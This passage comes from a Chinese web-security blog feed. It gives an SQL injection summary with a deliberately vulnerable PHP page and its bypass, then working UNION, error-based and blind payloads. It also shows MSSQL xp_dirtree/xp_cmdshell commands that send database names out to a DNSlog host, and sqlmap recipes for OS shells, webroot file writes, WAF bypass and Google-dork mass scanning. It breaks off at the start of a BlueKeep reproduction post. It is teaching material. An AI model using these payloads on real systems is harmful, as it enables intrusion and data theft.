class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'id'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> $_POST[<span class="string">'id'</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="comment">// debug 20190906 start</span></span><br><span class="line">    <span class="comment">//$tmp = urldecode($_POST['id']);</span></span><br><span class="line">    <span class="comment">//$tmp = addslashes($tmp);</span></span><br><span class="line">    <span class="comment">// debug 20190906 end</span></span><br><span class="line">    $tmp = addslashes($_POST[<span class="string">'id'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"before urldecode: "</span> . $tmp;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    $tmp = urldecode($tmp);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"POST DATA is: "</span> . $tmp;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    $keyword = <span class="string">"/(union select)|(order by)|(-- )|floor\(\)|updatexml\(\)|extractvalue\(\)|\/\*\*\/|(and 1=)/i"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match($keyword,$tmp))&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $id = $tmp;</span><br><span class="line">        $conn = @mysql_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'root'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'bad!'</span>);</span><br><span class="line">        mysql_query(<span class="string">'set names utf8'</span>);</span><br><span class="line">        @mysql_select_db(<span class="string">'test2'</span>, $conn) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"error"</span>);</span><br><span class="line">        $select_sql=<span class="string">"SELECT * FROM users WHERE id='$id' limit 0,1"</span>;</span><br><span class="line">        <span class="keyword">echo</span> $select_sql;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        $select_sql_result=mysql_query($select_sql,$conn);</span><br><span class="line">        $data=mysql_fetch_row($select_sql_result);</span><br><span class="line">        mysql_free_result($select_sql_result);</span><br><span class="line">        mysql_close($conn);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;hr/&gt;&lt;br/&gt;&lt;p&gt;"</span>;</span><br><span class="line">        print_r($data);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/p&gt;&lt;br/&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>当 <code>POST</code> 的数据是 <code>id=1%2527</code> 时，数据发送到服务端会解码一次变为 <code>id=1%27</code>  ，由于没有敏感字符，经过 <code>addslashes()</code> 函数过滤后，还是 <code>id=1%27</code>，此时再经过 <code>urldecode()</code> 解码函数，数据为 <code>id=1&#39;</code> 带入到 SQL 语句如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&apos;1&apos;&apos; limit 0, 1</span><br></pre></td></tr></table></figure><p><img src="/images/196SQLsum4.png" alt></p><p>如把 <code>urldecode()</code> 函数和 <code>addslashes()</code> 函数交换位置，<code>id=1%2527</code> 经服务器解码后为 <code>id=1%27</code> 然后再经 <code>urldecode()</code> 函数解码为 <code>id=1&#39;</code> ，然后再由 <code>addslashes()</code> 后为 <code>id=1\&#39;</code> ，可以看出来返回数据。</p><p><img src="/images/196SQLsum3.png" alt></p><h4 id="二次注入原理"><a href="#二次注入原理" class="headerlink" title="二次注入原理"></a>二次注入原理</h4><p>在第一次进行数据库插入数据的时候，仅仅只是使用了 <code>addslashes</code> 或者借助 <code>get_magic_quotes_gpc</code> 对其中的特殊字符进行转义，但是 <code>addslashes</code> 虽然参数在过滤后会添加 <code>\</code> 进行转义，但 <code>\</code> 并不会插入到数据库中，在写入数据库的时候还是保留了原来的数据。</p><p>在将数据存入到了数据库中之后，开发者认为数据是可信的，下次需要进行查询的时候，直接从数据库中取出脏数据，没有进行检验和处理，这样会造成 <code>SQL</code> 的二次注入。</p><p><img src="/images/194secinjec.png" alt></p><p>二次注入原理，主要分为两步：</p><ul><li><p>插入恶意数据</p><p>第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身包含恶意内容。</p></li><li><p>引用恶意数据</p><p>将数据存入到数据库中后，开发者认为数据是可信的。下次需要查询的时候，直接从数据库中取出恶意数据，没有进行进一步的检验何处理。</p></li></ul><h4 id="宽字节注入原理"><a href="#宽字节注入原理" class="headerlink" title="宽字节注入原理"></a>宽字节注入原理</h4><p><img src="/images/197%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5.png" alt></p><p>如何防止宽字节注入？</p><ul><li>使用 <code>mysql_set_charset(&quot;GBK&quot;)</code></li><li>使用 <code>mysql_real_escape_string($id)</code></li></ul><p><img src="/images/197%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A51.png" alt></p><h4 id="HTTP-头注入"><a href="#HTTP-头注入" class="headerlink" title="HTTP 头注入"></a>HTTP 头注入</h4><p><code>HTTP</code> 头部部分参数详解</p><table><thead><tr><th>参数</th><th>功能</th></tr></thead><tbody><tr><td>User-Agent</td><td>浏览器向服务器表名自己的身份，使得服务器能够识别客户使用的操作系统，浏览器版本</td></tr><tr><td>Cookie</td><td>网站为了辨别用户身份，进行 session 跟踪而储存在用户本地终端上的数据</td></tr><tr><td>X-Forwarded-For</td><td>简称 XFF 头，它代表客户端，HTTP 请求端真是的 IP</td></tr><tr><td>Referer</td><td>浏览器向 Web 服务器表名自己从哪个页面链接过来的</td></tr><tr><td>Host</td><td>客户端指定自己想访问的 Web 服务器的域名/ IP 地址和端口号</td></tr></tbody></table><p><img src="/images/197User_Agent.png" alt></p><p><img src="/images/197XFF.png" alt></p><h4 id="盲注步骤"><a href="#盲注步骤" class="headerlink" title="盲注步骤"></a>盲注步骤</h4><ol><li>先用 <code>count()</code> 判断个数</li><li>再用 <code>length()</code> 依次判断各个库名，表名，字段名的长度</li><li>用 <code>ascii()</code> + <code>substr()</code> + <code>if()</code> 结合判断出每个字符</li></ol><h4 id="外带查询原理"><a href="#外带查询原理" class="headerlink" title="外带查询原理"></a>外带查询原理</h4><p><img src="/images/197DNS.png" alt></p><p><code>MSSQL</code> 下，可以利用自带的存储过程或创建自定义的存储过程，向外发送网络请求。并利用<code>DNSlog</code> 接收外传的数据。常用的函数有：</p><ul><li><code>xp_subdirs</code></li><li><code>xp_dirtree</code></li><li><code>xp_fileexist</code></li><li><code>xp_cmdshell</code></li></ul><p>前三个存储过程的效果和使用方法几乎一致。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">declare @a varchar(1024);</span><br><span class="line">set @a=db_name();</span><br><span class="line">exec(&apos;master..xp_dirtree &quot;//&apos; %2B @a %2B &apos;.o0k708.ceye.io/123&quot;&apos;)</span><br></pre></td></tr></table></figure><p><code>xp_cmdshell</code> 要求必须为 <code>DBA</code> 权限下才可使用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sp_configure &apos;show advanced options&apos;,1;</span><br><span class="line">reconfigure;</span><br><span class="line">sp_configure &apos;xp_cmdshell&apos;,1;</span><br><span class="line">reconfigure;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">declare @a varchar(1024); </span><br><span class="line">set @a=&apos;www.baidu.com&apos;;</span><br><span class="line">exec (&apos;master..xp_cmdshell &quot;ping &apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io&quot; &apos;)</span><br></pre></td></tr></table></figure><h3 id="SQL-注入流程"><a href="#SQL-注入流程" class="headerlink" title="SQL 注入流程"></a>SQL 注入流程</h3><p><img src="/images/197SQL%E6%B3%A8%E5%85%A5.png" alt></p><h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p><img src="/images/197%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86.png" alt></p><h4 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h4><p><img src="/images/197%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE.png" alt></p><h5 id="移位溢注（使用ACCESS和MYSQL）"><a href="#移位溢注（使用ACCESS和MYSQL）" class="headerlink" title="移位溢注（使用ACCESS和MYSQL）"></a>移位溢注（使用ACCESS和MYSQL）</h5><p>可以在获取不了列名的情况下获取数据，但是要求后面的表个字段数小于前面表的字段数。</p><p>偏移注入的步骤：</p><ol><li>判断注入点</li><li>order by 判断长度</li><li>判断表名</li><li>联合查询</li><li>获取表中列数</li><li>开始偏移注入</li></ol><p>使用新方法注入：</p><p>获取 admin 表的列数：</p><p>用 <code>order by 24</code> 判断出字段长度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 返回错误页面</span><br><span class="line">UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,* FROM admin</span><br><span class="line"># 返回错误页面</span><br><span class="line">UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,* FROM admin</span><br><span class="line"># 返回错误页面</span><br><span class="line">UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,* FROM admin</span><br><span class="line"># 返回正确页面，因此admin表列数为4</span><br><span class="line">UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,* FROM admin</span><br></pre></td></tr></table></figure><p>判断出页面那些位置能够显示数据，比如 13, 14 可以显示数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,admin.*,17,18,19,20,21,22,23,24 FROM admin</span><br></pre></td></tr></table></figure><p><code>admin</code> 表的前两列能够显示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT 1,2,3,4,5,6,7,8,9,10,admin.*,15,1617,18,19,20,21,22,23,24 FROM admin</span><br></pre></td></tr></table></figure><p><code>admin</code> 表的后两列能够显示</p><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p><img src="/images/197%E6%8F%90%E6%9D%83.png" alt></p><h5 id="sqlmap-–os-shell-原理"><a href="#sqlmap-–os-shell-原理" class="headerlink" title="sqlmap –os-shell 原理"></a>sqlmap –os-shell 原理</h5><p><code>--os-shell</code> 流程</p><p><img src="/images/os_shell.png" alt></p><p>命令行界面：</p><p><img src="/images/os_shell.jpg" alt></p><p><code>--os-shell</code> 需要的条件：</p><ul><li><code>FILE</code> 权限</li><li>可写的绝对路径</li><li><code>PHP GPC</code> OFF</li></ul><p>原理简述：通过 <code>MySQL</code> 的 <code>into outfile</code> 和 <code>into dumpfile</code> 向网站目录下写入 <code>php</code> 代码，用来执行系统命令。</p><h4 id="MySQL-注入常用函数"><a href="#MySQL-注入常用函数" class="headerlink" title="MySQL 注入常用函数"></a>MySQL 注入常用函数</h4><table><thead><tr><th>函数名称</th><th>函数功能</th><th></th><th>函数名称</th><th>函数功能</th></tr></thead><tbody><tr><td>system_user()</td><td>系统用户名</td><td></td><td>concat()</td><td>没有分隔符地连接字符串</td></tr><tr><td>user()</td><td>用户名</td><td></td><td>concat_ws()</td><td>含有分隔符地连接字符串</td></tr><tr><td>current_user()</td><td>当前用户名</td><td></td><td>group_concat()</td><td>连接一个组所有字符串，并以逗号分隔每条数据</td></tr><tr><td>session_user()</td><td>连接数据库的用户名</td><td></td><td>load_file()</td><td>读取本地文件</td></tr><tr><td>database()</td><td>数据库名</td><td></td><td>into outfile()</td><td>写文件</td></tr><tr><td>version()</td><td>数据库版本</td><td></td><td>ascii()</td><td>字符串的 ASCII 码值</td></tr><tr><td>@@datadir</td><td>数据库路径</td><td></td><td>ord()</td><td>返回字符串第一个字符的 ASCII 值</td></tr><tr><td>@@basedir</td><td>数据库安装路径</td><td></td><td>mid()/substr()</td><td>返回一个字符串的一部分</td></tr><tr><td>@@version_compile_os</td><td>操作系统</td><td></td><td>length()</td><td>返回字符串长度</td></tr><tr><td>count()</td><td>返回执行结果数量</td><td></td><td>sleep()</td><td>让语句运行N秒钟</td></tr><tr><td>left()</td><td>返回字符串最左边几个字符</td><td></td><td>if()</td><td>&gt; select if(1&gt;2,2,3);-&gt; 3</td></tr><tr><td>floor()</td><td>返回小于或等于 x 的最大整数</td><td></td><td>char()</td><td>返回 ASCII 代码组成的字符串</td></tr><tr><td>extractvalue()</td><td>用于报错注入</td><td></td><td>updatexml()</td><td>用于报错注入</td></tr><tr><td>strcmp()</td><td>比较字符串内容</td><td></td><td>exp()</td><td>返回 e 的 x 次方</td></tr></tbody></table><p>常用的报错注入语句如下：</p><ul><li>floor()</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from (select count(*),concat(user()/*存放要查询的 SQL 语句*/,floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure><ul><li>extractvalue()</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (extractvalue(1,concat(0x7e,(select user()/*存放要查询的 SQL 语句*/),0x7e)));</span><br></pre></td></tr></table></figure><ul><li>updatexml()</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (updatexml(1,concat(0x7e,(select user()/*存放要查询的 SQL 语句*/),0x7e),1));</span><br></pre></td></tr></table></figure><h4 id="sqlmap-的使用"><a href="#sqlmap-的使用" class="headerlink" title="sqlmap 的使用"></a>sqlmap 的使用</h4><h5 id="指定-sqlmap-的探测技术"><a href="#指定-sqlmap-的探测技术" class="headerlink" title="指定 sqlmap 的探测技术"></a>指定 <code>sqlmap</code> 的探测技术</h5><p><code>--technique=TECH</code></p><ul><li>B: Boolean-based blind SQL injection</li><li>E: Error-based SQL injection</li><li>U: UNION query SQL injection</li><li>S: Stacked queries SQL injection</li><li>T: Time-based blind SQL injection</li></ul><h5 id="指定注入参数"><a href="#指定注入参数" class="headerlink" title="指定注入参数"></a>指定注入参数</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"url"</span> -p <span class="string">"id, user-agent"</span></span><br></pre></td></tr></table></figure><h5 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h5><p>好处：</p><pre><code>1. 方便测试某些网站 2. 代理关联上 `burp` ，方便我们学习 `sqlmap` 发包规则</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"url"</span> --proxy=<span class="string">"http://127.0.0.1:8080"</span></span><br></pre></td></tr></table></figure><p>设置好 <code>burp</code> ，可以在代理界面看到 <code>sqlmap</code> 发送的数据包。</p><h5 id="三种级别：详细程度-探测-风险"><a href="#三种级别：详细程度-探测-风险" class="headerlink" title="三种级别：详细程度/探测/风险"></a>三种级别：详细程度/探测/风险</h5><ul><li>详细程度：注入时 <code>sqlmap</code> 的界面显示的内容详细程度，级别程度为 0-6 ，默认为 1 ，指定参数用 <code>-v</code> 来表示。</li></ul><table><thead><tr><th align="center">级别</th><th align="center">介绍</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">只显示 python 错误以及严重的信息</td></tr><tr><td align="center">1</td><td align="center">同时显示基本信息和警告信息</td></tr><tr><td align="center">2</td><td align="center">同时显示 debug 信息</td></tr><tr><td align="center">3</td><td align="center">同时显示注入的 payload</td></tr><tr><td align="center">4</td><td align="center">同时显示 HTTP 请求头</td></tr><tr><td align="center">5</td><td align="center">同时显示 HTTP 响应头</td></tr><tr><td align="center">6</td><td align="center">同时显示 HTTP 响应页面</td></tr></tbody></table><ul><li>探测等级：指注入的 <code>payload</code> 语句的复杂程度，级别为 1-5，默认为 1 。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"url"</span> --level=LEVEL</span><br></pre></td></tr></table></figure><ol><li>使用哪些 <code>payload</code> 也影响注入点的选择</li><li><code>GET/POST</code> 都会测试，<code>level 2</code> 时，会测试 <code>cookie</code> ，<code>level 3</code> 时，会测试 <code>User-Agent</code> 和 <code>Referer</code>。</li></ol><ul><li>风险等级：指是否要使用具有不同级别风险的测试语句，级别为 1-3，默认为 1 。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"url"</span> --risk=RISK</span><br></pre></td></tr></table></figure><h5 id="跳过某些参数"><a href="#跳过某些参数" class="headerlink" title="跳过某些参数"></a>跳过某些参数</h5><ul><li>跳过注入参宿</li></ul><p>使用很大的 <code>level</code> 等级，但有些参数并不需要测试，就可以使用 <code>--skip</code> 参数。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"url"</span> --skip=<span class="string">"user-agent.referer"</span></span><br></pre></td></tr></table></figure><ul><li>跳过 <code>URL</code> 编码</li></ul><p>注入测试语句不经过 <code>url</code> 编码发送到服务器上。</p><ul><li>绕过 <code>URL</code> 重写规则</li></ul><p>有些时候 <code>Web</code> 服务器使用了 <code>URL</code> 重写，导致无法直接使用 <code>sqlmap</code> 测试参数，如 <a href="http://www.info.com/1018/2019.html" target="_blank" rel="noopener">测试URL</a> 这种格式的网址，在测试的参数后面加 <code>*</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://xxxx/info/1018*/2347.html"</span></span><br></pre></td></tr></table></figure><h5 id="闭合注入-Payload"><a href="#闭合注入-Payload" class="headerlink" title="闭合注入 Payload"></a>闭合注入 <code>Payload</code></h5><p>有些环境中，需要在注入的 <code>payload</code> 的前面或后面加一些字符来闭合符号，以保证 <code>payload</code> 的正常执行。</p><p>如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line">    $query = <span class="string">"SELECT * FROM users WHERE id=('"</span>.$_GET[<span class="string">'id'</span>].<span class="string">"') LIMIT 0,1"</span>;</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这时需要使用 <code>--prefix</code> 和 <code>--suffix</code> 参数，来进行闭合：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.111/sqlmap/mysql/get_str_brackets.php?id=1"</span> -p id --prefix <span class="string">"')"</span> --suffix <span class="string">"AND ('abc'='abc"</span></span><br></pre></td></tr></table></figure><p>这样执行的 <code>SQL</code> 语句变成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    $query = <span class="string">"SELECT * FROM users WHERE id=('1') &lt;PAYLOAD&gt; AND ('abc'='abc') LIMIT 0,1"</span>;</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h5 id="绕过-WAF-设备"><a href="#绕过-WAF-设备" class="headerlink" title="绕过 WAF 设备"></a>绕过 <code>WAF</code> 设备</h5><p><code>--tamper=TAMPER</code>，可以查看 <code>tamper/</code> 目录下有哪些可用的脚本。</p><h5 id="结合-Burp-使用"><a href="#结合-Burp-使用" class="headerlink" title="结合 Burp 使用"></a>结合 <code>Burp</code> 使用</h5><p>复制 <code>burp</code> 拦截的 <code>HTTP</code> 请求包，保存为 <code>1.txt</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r <span class="string">'path/1.txt'</span></span><br></pre></td></tr></table></figure><h5 id="批量扫描-burp-请求日志"><a href="#批量扫描-burp-请求日志" class="headerlink" title="批量扫描 burp 请求日志"></a>批量扫描 <code>burp</code> 请求日志</h5><ol><li>首先配置 <code>burp</code> 记录所有的 <code>request</code> 请求，并保存在指定文件夹</li></ol><p><img src="/images/197burp.png" alt></p><ol start="2"><li>接着浏览器设置 <code>burp</code> 代理，访问测试 url ，查看 <code>sql.txt</code>。</li></ol><p><img src="/images/197sqltxt.png" alt></p><pre><code>3. 使用 `sqlmap` 扫描。</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -l sql.txt --batch --smart <span class="comment"># batch 会自动选择 yes; smart 启动快速判断，节约时间</span></span><br></pre></td></tr></table></figure><h5 id="批量扫描文本中的多个目标"><a href="#批量扫描文本中的多个目标" class="headerlink" title="批量扫描文本中的多个目标"></a>批量扫描文本中的多个目标</h5><p>文本中保存 <code>url</code> 格式如下，<code>sqlmap</code> 会一个一个检测。</p><p><img src="/images/197sqlurltxt.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -m url.txt</span><br></pre></td></tr></table></figure><h5 id="利用正则过滤目标网址"><a href="#利用正则过滤目标网址" class="headerlink" title="利用正则过滤目标网址"></a>利用正则过滤目标网址</h5><p>参数：<code>--scope</code></p><p>例如：只想要 www 开头，.com/.net/.org 结尾的网址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -l burp.log --scope=<span class="string">"(www)?\.target\.(com|net|org)"</span></span><br></pre></td></tr></table></figure><h5 id="利用谷歌批量扫"><a href="#利用谷歌批量扫" class="headerlink" title="利用谷歌批量扫"></a>利用谷歌批量扫</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -g <span class="string">"inurl:\".php?id=1\""</span></span><br></pre></td></tr></table></figure><h5 id="关于文件写入与-shell-获取"><a href="#关于文件写入与-shell-获取" class="headerlink" title="关于文件写入与 shell 获取"></a>关于文件写入与 <code>shell</code> 获取</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">--sql-shell<span class="comment"># 执行指定 sql 命令</span></span><br><span class="line">--sql-query<span class="comment"># 执行指定的 sql 语句</span></span><br><span class="line">--file-read<span class="comment"># 读取指定文件</span></span><br><span class="line">--file-write<span class="comment"># 写入本地文件</span></span><br><span class="line">--file-write /<span class="built_in">test</span>/test.txt --file-dest /var/www/html/1.txt <span class="comment"># 将本地的test.txt文件写入目标的1.txt</span></span><br><span class="line">--file-dest<span class="comment"># 要写入文件的绝对路径</span></span><br><span class="line">--os-cmd<span class="comment"># 执行系统命令</span></span><br><span class="line">--os-shell<span class="comment"># 系统交互shell</span></span><br><span class="line">--reg-read<span class="comment"># 读取win系统注册表</span></span><br></pre></td></tr></table></figure><h3 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h3><p><code>WAF</code> : Web 应用防护系统，主要是对 Web 特有入侵方式的加强防护。只能防御固有特征的漏洞，无法防御逻辑漏洞/ CSRF 漏洞/SSRF 漏洞</p><p>![](/images/197WAF 分类.png)</p><h4 id="WAF-工作流程"><a href="#WAF-工作流程" class="headerlink" title="WAF 工作流程"></a>WAF 工作流程</h4><p><img src="/images/197WAF%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B.png" alt></p><h4 id="常见过-WAF技巧"><a href="#常见过-WAF技巧" class="headerlink" title="常见过 WAF技巧"></a>常见过 WAF技巧</h4><p><img src="/images/197%E5%B8%B8%E8%A7%81%E8%BF%87WAF%E6%8A%80%E5%B7%A7.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: SQL 注入总结，及&lt;code&gt;note38-note40&lt;/code&gt; 笔记整理。&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
    
      <category term="summary" scheme="http://yoursite.com/tags/summary/"/>
    
      <category term="SQL 注入" scheme="http://yoursite.com/tags/SQL-%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>远程桌面代码执行漏洞复现</title>
    <link href="http://yoursite.com/2019/09/07/bluekeep/"/>
    <id>http://yoursite.com/2019/09/07/bluekeep/</id>
    <published>2019-09-07T05:52:37.000Z</published>
    <updated>2019-09-08T14:26:00.844Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 打开 <code>Win7</code> 虚拟机中的远程桌面，利用 <code>Metasploit</code> 进行 <code>bluekeep(CVE-2019-0708)</code>漏洞复现。</p><a id="more"></a><!--export--><!--toc--><h3 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h3><p><code>VMware Workstation 15 Pro</code> + <code>Window 7 Service Pack 1</code> + <code>kail</code></p><h3 id="开启-Win-7-远程桌面"><a href="#开启-Win-7-远程桌面" class="headerlink" title="开启 Win 7 远程桌面"></a>开启 <code>Win 7</code> 远程桌面</h3><p>右击计算机，选择属性，在弹窗左侧选择远程设置，系统属性的远程选项卡中选择远程桌面为：<code>允许运行任意版本远程桌面计算机连接</code> 点击确定。</p><p><img src="/images/195bluekeep1.png" alt></p><p>查看 <code>ip</code> 地址</p><p><img src="/images/195bluekeep3.png" alt></p><h3 id="攻击工具准备"><a href="#攻击工具准备" class="headerlink" title="攻击工具准备"></a>攻击工具准备</h3><h4 id="在-kali-更新-msf"><a href="#在-kali-更新-msf" class="headerlink" title="在 kali 更新 msf"></a>在 <code>kali</code> 更新 <code>msf</code></h4><p>用 <code>leafpad</code> 打开 <code>sorces.list</code>，添加下面源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line"><span class="comment">#阿里云kali更新源</span></span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line"><span class="comment">#163 DEBIAN源</span></span><br><span class="line"></span><br><span class="line">deb http://mirrors.163.com/debian wheezy main non-free contrib</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.163.com/debian wheezy main non-free contrib</span><br><span class="line"></span><br><span 